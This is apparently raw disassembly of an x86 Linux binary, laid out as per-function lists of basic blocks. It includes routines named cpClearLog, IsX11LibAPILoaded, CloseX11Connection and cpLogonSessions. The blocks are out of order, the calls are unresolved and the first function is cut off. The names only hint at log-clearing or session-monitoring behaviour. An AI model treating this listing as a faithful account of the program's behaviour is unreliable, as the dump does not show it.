0x80557ea:	lea	eax, dword ptr [esp + 0x14]
0x80557ee:	push	eax
0x80557ef:	push	0x8058374
0x80557f4:	call	0x804f5a1
None
|
|
|
v
0x8055816:	mov	edx, dword ptr [esp + 0x1c]
0x805581a:	mov	ecx, edx
0x805581c:	sar	ecx, 0x1f
0x805581f:	mov	dword ptr [eax + 0x2000], esi
0x8055825:	mov	dword ptr [eax + 0x200c], ebx
0x805582b:	mov	dword ptr [eax + 0x2004], 2
0x8055835:	mov	byte ptr [eax + 0x2008], 0x35
0x805583c:	mov	byte ptr [eax + 0x2009], 0x36
0x8055843:	mov	byte ptr [eax + 0x200a], 0x37
0x805584a:	mov	dword ptr [eax + 0x2010], edx
0x8055850:	mov	dword ptr [eax + 0x2014], ecx
0x8055856:	mov	dword ptr [eax + 0x2018], 0
0x8055860:	mov	dword ptr [eax + 0x201c], 0
0x805586a:	pop	edx
0x805586b:	pop	ecx
0x805586c:	push	eax
0x805586d:	push	0x8053167
0x8055872:	call	0x804f559
None
|
|
|
v
0x80557f9:	add	esp, 0x10
0x80557fc:	test	eax, eax
0x80557fe:	mov	esi, eax
0x8055800:	je	0x8055879
None
|
|
|
v
0x8055877:	jmp	0x8055885
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpClearLog
TOTAL BLOCKS :4
0x805588b:	sub	esp, 0x18
0x805588e:	push	0x40
0x8055890:	call	0x8052879
None
|
|
|
v
0x8055895:	add	esp, 0x10
0x8055898:	test	al, al
0x805589a:	je	0x80558ad
None
|
|
|
v
0x805589c:	mov	ecx, 1
0x80558a1:	xor	edx, edx
0x80558a3:	xor	eax, eax
0x80558a5:	add	esp, 0xc
0x80558a8:	jmp	0x8054c98
None
|
|
|
v
0x80558ad:	add	esp, 0xc
0x80558b0:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_80558b4
TOTAL BLOCKS :1
0x80558b4:	xor	eax, eax
0x80558b6:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:IsX11LibAPILoaded
TOTAL BLOCKS :72
0x8055b43:	push	eax
0x8055b44:	push	eax
0x8055b45:	push	0x80568b6
0x8055b4a:	push	ebx
0x8055b4b:	call	0x804f6a5
None
|
|
|
v
0x8055bd4:	push	eax
0x8055bd5:	push	eax
0x8055bd6:	push	0x8056806
0x8055bdb:	push	ebx
0x8055bdc:	call	0x804f6a5
None
|
|
|
v
0x8055ced:	add	esp, 0x2200
0x8055cf3:	mov	al, dl
0x8055cf5:	pop	ebx
0x8055cf6:	pop	esi
0x8055cf7:	pop	edi
0x8055cf8:	ret	
None
|
|
|
v
0x8055b09:	push	eax
0x8055b0a:	push	eax
0x8055b0b:	push	0x805689b
0x8055b10:	push	ebx
0x8055b11:	call	0x804f6a5
None
|
|
|
v
0x8055adc:	add	esp, 0x10
0x8055adf:	test	eax, eax
0x8055ae1:	mov	dword ptr [0x805be2c], eax
0x8055ae6:	je	0x8055cdf
None
|
|
|
v
0x80559ea:	sub	esp, 0xc
0x80559ed:	push	0x1100
0x80559f2:	lea	ebx, dword ptr [esp + 0x1110]
0x80559f9:	push	ebx
0x80559fa:	push	0x8000
0x80559ff:	push	0x80567a6
0x8055a04:	push	0x80561b6
0x8055a09:	call	0x804f39a
None
|
|
|
v
0x8055943:	add	esp, 0x20
0x8055946:	xor	edx, edx
0x8055948:	test	al, al
0x805594a:	je	0x8055ced
None
|
|
|
v
0x80558b7:	push	edi
0x80558b8:	push	esi
0x80558b9:	push	ebx
0x80558ba:	sub	esp, 0x2200
0x80558c0:	mov	eax, dword ptr [0x805be14]
0x80558c5:	mov	esi, dword ptr [esp + 0x2210]
0x80558cc:	cmp	eax, 0xff
0x80558d1:	jne	0x80558df
None
|
|
|
v
0x8055be1:	add	esp, 0x10
0x8055be4:	test	eax, eax
0x8055be6:	mov	dword ptr [0x805be6c], eax
0x8055beb:	je	0x8055cdf
None
|
|
|
v
0x8055c38:	add	esp, 0x10
0x8055c3b:	test	eax, eax
0x8055c3d:	mov	dword ptr [0x805be68], eax
0x8055c42:	je	0x8055cdf
None
|
|
|
v
0x8055abf:	add	esp, 0x10
0x8055ac2:	test	eax, eax
0x8055ac4:	mov	dword ptr [0x805be28], eax
0x8055ac9:	je	0x8055cdf
None
|
|
|
v
0x8055902:	sub	esp, 0xc
0x8055905:	push	0x1100
0x805590a:	push	ebx
0x805590b:	push	0x8000
0x8055910:	push	0x8056781
0x8055915:	push	0x8056776
0x805591a:	call	0x804f39a
None
|
|
|
v
0x8055b6d:	add	esp, 0x10
0x8055b70:	test	eax, eax
0x8055b72:	mov	dword ptr [0x805be78], eax
0x8055b77:	je	0x8055cdf
None
|
|
|
v
0x8055b16:	add	esp, 0x10
0x8055b19:	test	eax, eax
0x8055b1b:	mov	dword ptr [0x805be3c], eax
0x8055b20:	je	0x8055cdf
None
|
|
|
v
0x8055c87:	add	esp, 0x10
0x8055c8a:	test	eax, eax
0x8055c8c:	mov	dword ptr [0x805be84], eax
0x8055c91:	je	0x8055cdf
None
|
|
|
v
0x8055b50:	add	esp, 0x10
0x8055b53:	test	eax, eax
0x8055b55:	mov	dword ptr [0x805be50], eax
0x8055b5a:	je	0x8055cdf
None
|
|
|
v
0x8055cdb:	mov	dl, 1
0x8055cdd:	jmp	0x8055ced
None
|
|
|
v
0x8055b26:	push	eax
0x8055b27:	push	eax
0x8055b28:	push	0x80568a6
0x8055b2d:	push	ebx
0x8055b2e:	call	0x804f6a5
None
|
|
|
v
0x8055b33:	add	esp, 0x10
0x8055b36:	test	eax, eax
0x8055b38:	mov	dword ptr [0x805be54], eax
0x8055b3d:	je	0x8055cdf
None
|
|
|
v
0x8055bb7:	push	eax
0x8055bb8:	push	eax
0x8055bb9:	push	0x80568ec
0x8055bbe:	push	ebx
0x8055bbf:	call	0x804f6a5
None
|
|
|
v
0x8055a95:	push	edx
0x8055a96:	push	edx
0x8055a97:	push	0x80567d5
0x8055a9c:	push	ebx
0x8055a9d:	call	0x804f6a5
None
|
|
|
v
0x805597f:	sub	esp, 0xc
0x8055982:	push	0x1100
0x8055987:	push	ebx
0x8055988:	push	0x8000
0x805598d:	push	0x80567a6
0x8055992:	push	0x805678c
0x8055997:	jmp	0x8055a2d
None
|
|
|
v
0x8055cdf:	inc	dword ptr [0x805be14]
0x8055ce5:	mov	dword ptr [esi], 0
0x8055ceb:	xor	edx, edx
0x8055ced:	add	esp, 0x2200
0x8055cf3:	mov	al, dl
0x8055cf5:	pop	ebx
0x8055cf6:	pop	esi
0x8055cf7:	pop	edi
0x8055cf8:	ret	
None
|
|
|
v
0x8055cac:	sub	esp, 0xc
0x8055caf:	push	0x80558b4
0x8055cb4:	mov	dword ptr [0x805be14], 0xff
0x8055cbe:	call	dword ptr [0x805be70]
None
|
|
|
v
0x8055c61:	push	ecx
0x8055c62:	push	ecx
0x8055c63:	push	0x805691e
0x8055c68:	push	ebx
0x8055c69:	call	0x804f6a5
None
|
|
|
v
0x8055a69:	add	esp, 0x10
0x8055a6c:	xor	edx, edx
0x8055a6e:	test	eax, eax
0x8055a70:	mov	edi, eax
0x8055a72:	je	0x8055ced
None
|
|
|
v
0x8055af9:	add	esp, 0x10
0x8055afc:	test	eax, eax
0x8055afe:	mov	dword ptr [0x805be1c], eax
0x8055b03:	je	0x8055cdf
None
|
|
|
v
0x8055c1b:	add	esp, 0x10
0x8055c1e:	test	eax, eax
0x8055c20:	mov	dword ptr [0x805be58], eax
0x8055c25:	je	0x8055cdf
None
|
|
|
v
0x805599c:	sub	esp, 0xc
0x805599f:	push	0x1100
0x80559a4:	push	ebx
0x80559a5:	push	0x8000
0x80559aa:	push	0x8056781
0x80559af:	push	0x80561b6
0x80559b4:	call	0x804f39a
None
|
|
|
v
0x8055aec:	push	eax
0x8055aed:	push	eax
0x8055aee:	push	0x8056894
0x8055af3:	push	ebx
0x8055af4:	call	0x804f6a5
None
|
|
|
v
0x8055a3f:	sub	esp, 0xc
0x8055a42:	lea	eax, dword ptr [esp + 0xc]
0x8055a46:	push	eax
0x8055a47:	call	0x804f693
None
|
|
|
v
0x80558d3:	mov	eax, dword ptr [0x805be18]
0x80558d8:	mov	dword ptr [esi], eax
0x80558da:	jmp	0x8055cdb
None
|
|
|
v
0x8055bfe:	add	esp, 0x10
0x8055c01:	test	eax, eax
0x8055c03:	mov	dword ptr [0x805be60], eax
0x8055c08:	je	0x8055cdf
None
|
|
|
v
0x8055c93:	push	eax
0x8055c94:	push	eax
0x8055c95:	push	0x8056938
0x8055c9a:	push	ebx
0x8055c9b:	call	0x804f6a5
None
|
|
|
v
0x8055ba7:	add	esp, 0x10
0x8055baa:	test	eax, eax
0x8055bac:	mov	dword ptr [0x805be74], eax
0x8055bb1:	je	0x8055cdf
None
|
|
|
v
0x8055c7a:	push	edx
0x8055c7b:	push	edx
0x8055c7c:	push	0x805692b
0x8055c81:	push	ebx
0x8055c82:	call	0x804f6a5
None
|
|
|
v
0x8055a59:	sub	esp, 0xc
0x8055a5c:	lea	eax, dword ptr [esp + 0x110c]
0x8055a63:	push	eax
0x8055a64:	call	0x804f693
None
|
|
|
v
0x8055acf:	push	eax
0x8055ad0:	push	eax
0x8055ad1:	push	0x8056814
0x8055ad6:	push	ebx
0x8055ad7:	call	0x804f6a5
None
|
|
|
v
0x8055c48:	push	edi
0x8055c49:	push	edi
0x8055c4a:	push	0x8056910
0x8055c4f:	push	ebx
0x8055c50:	call	0x804f6a5
None
|
|
|
v
0x8055926:	sub	esp, 0xc
0x8055929:	push	0x1100
0x805592e:	push	ebx
0x805592f:	push	0x8000
0x8055934:	push	0x8056781
0x8055939:	push	0x805678c
0x805593e:	call	0x804f39a
None
|
|
|
v
0x80558df:	cmp	eax, 4
0x80558e2:	je	0x8055ce5
None
|
|
|
v
0x8055ca0:	add	esp, 0x10
0x8055ca3:	test	eax, eax
0x8055ca5:	mov	dword ptr [0x805be24], eax
0x8055caa:	je	0x8055cdf
None
|
|
|
v
0x8055b60:	push	ecx
0x8055b61:	push	ecx
0x8055b62:	push	0x80568c1
0x8055b67:	push	ebx
0x8055b68:	call	0x804f6a5
None
|
|
|
v
0x8055ab2:	push	eax
0x8055ab3:	push	eax
0x8055ab4:	push	0x80567e0
0x8055ab9:	push	ebx
0x8055aba:	call	0x804f6a5
None
|
|
|
v
0x8055974:	add	esp, 0x20
0x8055977:	test	al, al
0x8055979:	jne	0x8055a3f
None
|
|
|
v
0x8055a2d:	call	0x804f39a
None
|
|
|
v
0x8055c6e:	add	esp, 0x10
0x8055c71:	test	eax, eax
0x8055c73:	mov	dword ptr [0x805be4c], eax
0x8055c78:	je	0x8055cdf
None
|
|
|
v
0x8055ce5:	mov	dword ptr [esi], 0
0x8055ceb:	xor	edx, edx
0x8055ced:	add	esp, 0x2200
0x8055cf3:	mov	al, dl
0x8055cf5:	pop	ebx
0x8055cf6:	pop	esi
0x8055cf7:	pop	edi
0x8055cf8:	ret	
None
|
|
|
v
0x8055c0e:	push	eax
0x8055c0f:	push	eax
0x8055c10:	push	0x8056904
0x8055c15:	push	ebx
0x8055c16:	call	0x804f6a5
None
|
|
|
v
0x80559dd:	add	esp, 0x20
0x80559e0:	xor	edx, edx
0x80559e2:	test	al, al
0x80559e4:	je	0x8055ced
None
|
|
|
v
0x8055bf1:	push	eax
0x8055bf2:	push	eax
0x8055bf3:	push	0x80568f6
0x8055bf8:	push	ebx
0x8055bf9:	call	0x804f6a5
None
|
|
|
v
0x8055b9a:	push	eax
0x8055b9b:	push	eax
0x8055b9c:	push	0x80568df
0x8055ba1:	push	ebx
0x8055ba2:	call	0x804f6a5
None
|
|
|
v
0x8055bc4:	add	esp, 0x10
0x8055bc7:	test	eax, eax
0x8055bc9:	mov	dword ptr [0x805be64], eax
0x8055bce:	je	0x8055cdf
None
|
|
|
v
0x8055c2b:	push	eax
0x8055c2c:	push	eax
0x8055c2d:	push	0x805684a
0x8055c32:	push	edi
0x8055c33:	call	0x804f6a5
None
|
|
|
v
0x8055aa2:	add	esp, 0x10
0x8055aa5:	test	eax, eax
0x8055aa7:	mov	dword ptr [0x805be48], eax
0x8055aac:	je	0x8055cdf
None
|
|
|
v
0x8055a32:	add	esp, 0x20
0x8055a35:	xor	edx, edx
0x8055a37:	test	al, al
0x8055a39:	je	0x8055ced
None
|
|
|
v
0x80558e8:	sub	esp, 0xc
0x80558eb:	push	0x8056776
0x80558f0:	call	0x804f141
None
|
|
|
v
0x805591f:	add	esp, 0x20
0x8055922:	test	al, al
0x8055924:	jne	0x8055950
None
|
|
|
v
0x8055a85:	add	esp, 0x10
0x8055a88:	test	eax, eax
0x8055a8a:	mov	dword ptr [0x805be34], eax
0x8055a8f:	je	0x8055cdf
None
|
|
|
v
0x8055950:	sub	esp, 0xc
0x8055953:	push	0x1100
0x8055958:	lea	ebx, dword ptr [esp + 0x1110]
0x805595f:	push	ebx
0x8055960:	push	0x8000
0x8055965:	push	0x80567a6
0x805596a:	push	0x8056776
0x805596f:	call	0x804f39a
None
|
|
|
v
0x8055a4c:	add	esp, 0x10
0x8055a4f:	test	eax, eax
0x8055a51:	mov	ebx, eax
0x8055a53:	je	0x8055cdf
None
|
|
|
v
0x8055b8a:	add	esp, 0x10
0x8055b8d:	test	eax, eax
0x8055b8f:	mov	dword ptr [0x805be70], eax
0x8055b94:	je	0x8055cdf
None
|
|
|
v
0x8055a0e:	add	esp, 0x20
0x8055a11:	test	al, al
0x8055a13:	jne	0x8055a3f
None
|
|
|
v
0x8055a15:	sub	esp, 0xc
0x8055a18:	push	0x1100
0x8055a1d:	push	ebx
0x8055a1e:	push	0x8000
0x8055a23:	push	0x80567a6
0x8055a28:	push	0x80567b0
0x8055a2d:	call	0x804f39a
None
|
|
|
v
0x80559b9:	add	esp, 0x20
0x80559bc:	test	al, al
0x80559be:	jne	0x80559ea
None
|
|
|
v
0x8055cc4:	mov	dword ptr [esp], 0
0x8055ccb:	call	dword ptr [0x805be34]
None
|
|
|
v
0x8055a78:	push	ecx
0x8055a79:	push	ecx
0x8055a7a:	push	0x80567c8
0x8055a7f:	push	ebx
0x8055a80:	call	0x804f6a5
None
|
|
|
v
0x8055b7d:	push	edx
0x8055b7e:	push	edx
0x8055b7f:	push	0x80568ce
0x8055b84:	push	ebx
0x8055b85:	call	0x804f6a5
None
|
|
|
v
0x8055cd1:	add	esp, 0x10
0x8055cd4:	mov	dword ptr [0x805be18], eax
0x8055cd9:	mov	dword ptr [esi], eax
0x8055cdb:	mov	dl, 1
0x8055cdd:	jmp	0x8055ced
None
|
|
|
v
0x8055c55:	add	esp, 0x10
0x8055c58:	test	eax, eax
0x8055c5a:	mov	dword ptr [0x805be7c], eax
0x8055c5f:	je	0x8055cdf
None
|
|
|
v
0x80559c0:	sub	esp, 0xc
0x80559c3:	push	0x1100
0x80559c8:	push	ebx
0x80559c9:	push	0x8000
0x80559ce:	push	0x8056781
0x80559d3:	push	0x80567b0
0x80559d8:	call	0x804f39a
None
|
|
|
v
0x80558f5:	add	esp, 0x10
0x80558f8:	mov	ebx, esp
0x80558fa:	test	al, al
0x80558fc:	je	0x805599c
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CloseX11Connection
TOTAL BLOCKS :4
0x8055d17:	add	esp, 0x10
0x8055d1a:	add	esp, 0xc
0x8055d1d:	ret	
None
|
|
|
v
0x8055d1a:	add	esp, 0xc
0x8055d1d:	ret	
None
|
|
|
v
0x8055d08:	sub	esp, 0xc
0x8055d0b:	push	dword ptr [0x805be18]
0x8055d11:	call	dword ptr [0x805be6c]
None
|
|
|
v
0x8055cf9:	sub	esp, 0xc
0x8055cfc:	cmp	dword ptr [0x805be14], 0xff
0x8055d06:	jne	0x8055d1a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpLogonSessions
TOTAL BLOCKS :17
0x8055dd3:	mov	eax, dword ptr [esp + 8]
0x8055dd7:	test	eax, eax
0x8055dd9:	je	0x8055df2
None
|
|
|
v
0x8055dc4:	test	eax, eax
0x8055dc6:	mov	ebx, eax
0x8055dc8:	jne	0x8055d48
None
|
|
|
v
0x8055df2:	push	0
0x8055df4:	push	0
0x8055df6:	push	0x23
0x8055df8:	push	edi
0x8055df9:	call	0x804e62a
None
|
|
|
v
0x8055dce:	call	0x804bc20
None
|
|
|
v
0x8055de5:	pop	eax
0x8055de6:	lea	eax, dword ptr [esp + 0x14]
0x8055dea:	push	eax
0x8055deb:	call	0x804f57c
None
|
|
|
v
0x8055dbf:	call	0x804bd70
None
|
|
|
v
0x8055db8:	mov	dword ptr [esp + 0x28], eax
0x8055dbc:	add	esp, 0x20
0x8055dbf:	call	0x804bd70
None
|
|
|
v
0x8055dfe:	add	esp, 0x2c
0x8055e01:	pop	ebx
0x8055e02:	pop	esi
0x8055e03:	pop	edi
0x8055e04:	pop	ebp
0x8055e05:	ret	
None
|
|
|
v
0x8055df0:	jmp	0x8055dfe
None
|
|
|
v
0x8055d20:	push	ebp
0x8055d21:	push	edi
0x8055d22:	push	esi
0x8055d23:	xor	esi, esi
0x8055d25:	push	ebx
0x8055d26:	sub	esp, 0x1c
0x8055d29:	mov	edi, dword ptr [esp + 0x30]
0x8055d2d:	lea	ebp, dword ptr [esp + 0xc]
0x8055d31:	mov	dword ptr [esp + 8], 0
0x8055d39:	mov	dword ptr [esp + 0xc], 0
0x8055d41:	call	0x804bed0
None
|
|
|
v
0x8055ddb:	push	esi
0x8055ddc:	push	eax
0x8055ddd:	push	0x22
0x8055ddf:	push	edi
0x8055de0:	call	0x804e62a
None
|
|
|
v
0x8055d46:	jmp	0x8055dbf
None
|
|
|
v
0x8055d4e:	sub	esp, 0xc
0x8055d51:	lea	eax, dword ptr [ebx + 0x154]
0x8055d57:	push	eax
0x8055d58:	call	0x804bdb0
None
|
|
|
v
0x8055d9a:	add	esp, 0x40
0x8055d9d:	cmp	eax, 0xff
0x8055da0:	mov	ebx, eax
0x8055da2:	je	0x8055dbf
None
|
|
|
v
0x8055d48:	cmp	byte ptr [ebx + 0x2c], 0
0x8055d4c:	je	0x8055dbf
None
|
|
|
v
0x8055da4:	sub	esp, 0xc
0x8055da7:	push	1
0x8055da9:	push	eax
0x8055daa:	push	ebp
0x8055dab:	push	esi
0x8055dac:	add	esi, ebx
0x8055dae:	lea	eax, dword ptr [esp + 0x24]
0x8055db2:	push	eax
0x8055db3:	call	0x8051f2f
None
|
|
|
v
0x8055d5d:	pop	edx
0x8055d5e:	pop	ecx
0x8055d5f:	lea	edx, dword ptr [ebx + 0x4c]
0x8055d62:	push	edx
0x8055d63:	push	dword ptr [eax]
0x8055d65:	push	dword ptr [eax + 4]
0x8055d68:	push	dword ptr [eax + 8]
0x8055d6b:	mov	edx, dword ptr [eax + 0x14]
0x8055d6e:	add	edx, 0x76c
0x8055d74:	push	edx
0x8055d75:	mov	edx, dword ptr [eax + 0x10]
0x8055d78:	inc	edx
0x8055d79:	push	edx
0x8055d7a:	push	dword ptr [eax + 0xc]
0x8055d7d:	lea	eax, dword ptr [ebx + 8]
0x8055d80:	push	eax
0x8055d81:	lea	eax, dword ptr [ebx + 0x28]
0x8055d84:	push	eax
0x8055d85:	lea	eax, dword ptr [ebx + 0x2c]
0x8055d88:	push	eax
0x8055d89:	movsx	eax, word ptr [ebx]
0x8055d8c:	push	eax
0x8055d8d:	push	0x8056949
0x8055d92:	push	1
0x8055d94:	push	ebp
0x8055d95:	call	0x804bd20
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_8055e10
TOTAL BLOCKS :3
0x8055e1f:	add	ebx, 0x21d5
0x8055e25:	mov	dword ptr [esp], 3
0x8055e2c:	mov	dword ptr [esp + 8], eax
0x8055e30:	mov	eax, dword ptr [ebp + 8]
0x8055e33:	mov	dword ptr [esp + 4], eax
0x8055e37:	call	0x804bf40
None
|
|
|
v
0x8055e3c:	add	esp, 0xc
0x8055e3f:	pop	ebx
0x8055e40:	pop	ebp
0x8055e41:	ret	
None
|
|
|
v
0x8055e10:	push	ebp
0x8055e11:	mov	ebp, esp
0x8055e13:	push	ebx
0x8055e14:	sub	esp, 0xc
0x8055e17:	mov	eax, dword ptr [ebp + 0xc]
0x8055e1a:	call	0x8055e42
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_8055e42
TOTAL BLOCKS :1
0x8055e42:	mov	ebx, dword ptr [esp]
0x8055e45:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_8055e50
TOTAL BLOCKS :3
0x8055e5f:	add	ebx, 0x2195
0x8055e65:	mov	dword ptr [esp], 3
0x8055e6c:	mov	dword ptr [esp + 8], eax
0x8055e70:	mov	eax, dword ptr [ebp + 8]
0x8055e73:	mov	dword ptr [esp + 4], eax
0x8055e77:	call	0x804bf90
None
|
|
|
v
0x8055e7c:	add	esp, 0xc
0x8055e7f:	pop	ebx
0x8055e80:	pop	ebp
0x8055e81:	ret	
None
|
|
|
v
0x8055e50:	push	ebp
0x8055e51:	mov	ebp, esp
0x8055e53:	push	ebx
0x8055e54:	sub	esp, 0xc
0x8055e57:	mov	eax, dword ptr [ebp + 0xc]
0x8055e5a:	call	0x8055e42
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__pthread_key_create
TOTAL BLOCKS :1
0x90009d0:	jmp	dword ptr [ebx + 0xc]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__pthread_getspecific
TOTAL BLOCKS :1
0x90009e0:	jmp	dword ptr [ebx + 0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:free
TOTAL BLOCKS :1
0x90009f0:	jmp	dword ptr [ebx + 0x14]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__pthread_once
TOTAL BLOCKS :1
0x9000a70:	jmp	dword ptr [ebx + 0x34]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__pthread_setspecific
TOTAL BLOCKS :1
0x9000ab0:	jmp	dword ptr [ebx + 0x44]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:calloc
TOTAL BLOCKS :1
0x9000ac0:	jmp	dword ptr [ebx + 0x48]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_9000b00
TOTAL BLOCKS :1
0x9000b00:	mov	ebx, dword ptr [esp]
0x9000b03:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:dlclose
TOTAL BLOCKS :7
0x9000dd0:	push	ebx
0x9000dd1:	call	0x9000b00
None
|
|
|
v
0x9000e0d:	jmp	0x9000e02
None
|
|
|
v
0x9000e07:	mov	dword ptr [esp], edx
0x9000e0a:	call	dword ptr [eax + 4]
None
|
|
|
v
0x9000df8:	test	eax, eax
0x9000dfa:	setne	al
0x9000dfd:	movzx	eax, al
0x9000e00:	neg	eax
0x9000e02:	add	esp, 0x18
0x9000e05:	pop	ebx
0x9000e06:	ret	
None
|
|
|
v
0x9000dd6:	add	ebx, 0x322a
0x9000ddc:	sub	esp, 0x18
0x9000ddf:	mov	edx, dword ptr [esp + 0x20]
0x9000de3:	mov	eax, dword ptr [ebx + 0x54]
0x9000de9:	test	eax, eax
0x9000deb:	jne	0x9000e07
None
|
|
|
v
0x9000e02:	add	esp, 0x18
0x9000e05:	pop	ebx
0x9000e06:	ret	
None
|
|
|
v
0x9000ded:	lea	eax, dword ptr [ebx - 0x3260]
0x9000df3:	call	0x9001300
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:dlsym
TOTAL BLOCKS :9
0x9000eaa:	add	esp, 0x2c
0x9000ead:	pop	ebx
0x9000eae:	pop	esi
0x9000eaf:	pop	edi
0x9000eb0:	pop	ebp
0x9000eb1:	ret	
None
|
|
|
v
0x9000e49:	add	ebx, 0x31b7
0x9000e4f:	sub	esp, 0x2c
0x9000e52:	mov	edx, dword ptr [esp + 0x40]
0x9000e56:	mov	eax, dword ptr [esp + 0x44]
0x9000e5a:	mov	edi, dword ptr [ebx + 0x54]
0x9000e60:	test	edi, edi
0x9000e62:	jne	0x9000eb2
None
|
|
|
v
0x9000e89:	lea	edx, dword ptr [esp + 0x10]
0x9000e8d:	lea	eax, dword ptr [ebx - 0x31f0]
0x9000e93:	call	0x9001300
None
|
|
|
v
0x9000e64:	mov	esi, dword ptr [ebx - 4]
0x9000e6a:	mov	ecx, dword ptr [esp + 0x3c]
0x9000e6e:	mov	dword ptr [esp + 0x10], edx
0x9000e72:	mov	dword ptr [esp + 0x14], eax
0x9000e76:	lea	ebp, dword ptr [esi + 0x4c4]
0x9000e7c:	mov	dword ptr [esp + 0x18], ecx
0x9000e80:	mov	dword ptr [esp], ebp
0x9000e83:	call	dword ptr [esi + 0x7f8]
None
|
|
|
v
0x9000e98:	mov	dword ptr [esp], ebp
0x9000e9b:	test	eax, eax
0x9000e9d:	cmove	edi, dword ptr [esp + 0x1c]
0x9000ea2:	call	dword ptr [esi + 0x7fc]
None
|
|
|
v
0x9000ea8:	mov	eax, edi
0x9000eaa:	add	esp, 0x2c
0x9000ead:	pop	ebx
0x9000eae:	pop	esi
0x9000eaf:	pop	edi
0x9000eb0:	pop	ebp
0x9000eb1:	ret	
None
|
|
|
v
0x9000ec6:	jmp	0x9000eaa
None
|
|
|
v
0x9000e40:	push	ebp
0x9000e41:	push	edi
0x9000e42:	push	esi
0x9000e43:	push	ebx
0x9000e44:	call	0x9000b00
None
|
|
|
v
0x9000eb2:	mov	esi, dword ptr [esp + 0x3c]
0x9000eb6:	mov	ecx, dword ptr [edi + 8]
0x9000eb9:	mov	dword ptr [esp + 4], eax
0x9000ebd:	mov	dword ptr [esp], edx
0x9000ec0:	mov	dword ptr [esp + 8], esi
0x9000ec4:	call	ecx
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_9000fb0
TOTAL BLOCKS :6
0x9000fb0:	push	ebx
0x9000fb1:	call	0x9000b00
None
|
|
|
v
0x9000ff1:	add	esp, 0x18
0x9000ff4:	pop	ebx
0x9000ff5:	ret	
None
|
|
|
v
0x9000fe5:	lea	eax, dword ptr [ebx + 0x64]
0x9000feb:	mov	dword ptr [ebx + 0x60], eax
0x9000ff1:	add	esp, 0x18
0x9000ff4:	pop	ebx
0x9000ff5:	ret	
None
|
|
|
v
0x9000fe1:	test	eax, eax
0x9000fe3:	je	0x9000ff1
None
|
|
|
v
0x9000fb6:	add	ebx, 0x304a
0x9000fbc:	sub	esp, 0x18
0x9000fbf:	mov	eax, dword ptr [ebx - 0x34]
0x9000fc5:	test	eax, eax
0x9000fc7:	je	0x9000fe5
None
|
|
|
v
0x9000fc9:	lea	eax, dword ptr [ebx - 0x2f80]
0x9000fcf:	mov	dword ptr [esp + 4], eax
0x9000fd3:	lea	eax, dword ptr [ebx + 0x5c]
0x9000fd9:	mov	dword ptr [esp], eax
0x9000fdc:	call	0x90009d0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_9001300
TOTAL BLOCKS :23
0x900130d:	add	ebx, 0x2cf3
0x9001313:	sub	esp, 0x1c
0x9001316:	mov	dword ptr [ebp - 0x1c], eax
0x9001319:	mov	ecx, dword ptr [ebx - 0x14]
0x900131f:	test	ecx, ecx
0x9001321:	je	0x900141c
None
|
|
|
v
0x900140c:	jmp	0x9001349
None
|
|
|
v
0x900142e:	or	dword ptr [ebx + 0x58], 2
0x9001435:	jmp	0x900133f
None
|
|
|
v
0x9001429:	call	0x9000fb0
None
|
|
|
v
0x90013ba:	mov	eax, dword ptr [ebx + 0x5c]
0x90013c0:	mov	dword ptr [esp], eax
0x90013c3:	call	0x90009e0
None
|
|
|
v
0x90013ec:	mov	eax, dword ptr [ebx - 8]
0x90013f2:	test	eax, eax
0x90013f4:	je	0x9001349
None
|
|
|
v
0x9001411:	lea	esi, dword ptr [ebx + 0x64]
0x9001417:	jmp	0x9001349
None
|
|
|
v
0x900141c:	cmp	dword ptr [ebx + 0x58], 0
0x9001423:	jne	0x900133f
None
|
|
|
v
0x90013fa:	mov	eax, dword ptr [ebx + 0x5c]
0x9001400:	mov	dword ptr [esp + 4], esi
0x9001404:	mov	dword ptr [esp], eax
0x9001407:	call	0x9000ab0
None
|
|
|
v
0x9001350:	cmp	byte ptr [esi + 8], 0
0x9001354:	jne	0x90013a0
None
|
|
|
v
0x90013b0:	mov	edx, dword ptr [ebx - 0x28]
0x90013b6:	test	edx, edx
0x90013b8:	je	0x90013d2
None
|
|
|
v
0x900137c:	xor	edx, edx
0x900137e:	mov	dword ptr [esi], eax
0x9001380:	mov	eax, dword ptr [esi + 0x10]
0x9001383:	sub	esp, 8
0x9001386:	test	eax, eax
0x9001388:	sete	dl
0x900138b:	setne	al
0x900138e:	mov	dword ptr [esi + 4], edx
0x9001391:	lea	esp, dword ptr [ebp - 0xc]
0x9001394:	movzx	eax, al
0x9001397:	pop	ebx
0x9001398:	pop	esi
0x9001399:	pop	edi
0x900139a:	pop	ebp
0x900139b:	ret	
None
|
|
|
v
0x9001327:	lea	eax, dword ptr [ebx - 0x3050]
0x900132d:	mov	dword ptr [esp + 4], eax
0x9001331:	lea	eax, dword ptr [ebx + 0x58]
0x9001337:	mov	dword ptr [esp], eax
0x900133a:	call	0x9000a70
None
|
|
|
v
0x90013a8:	jmp	0x9001356
None
|
|
|
v
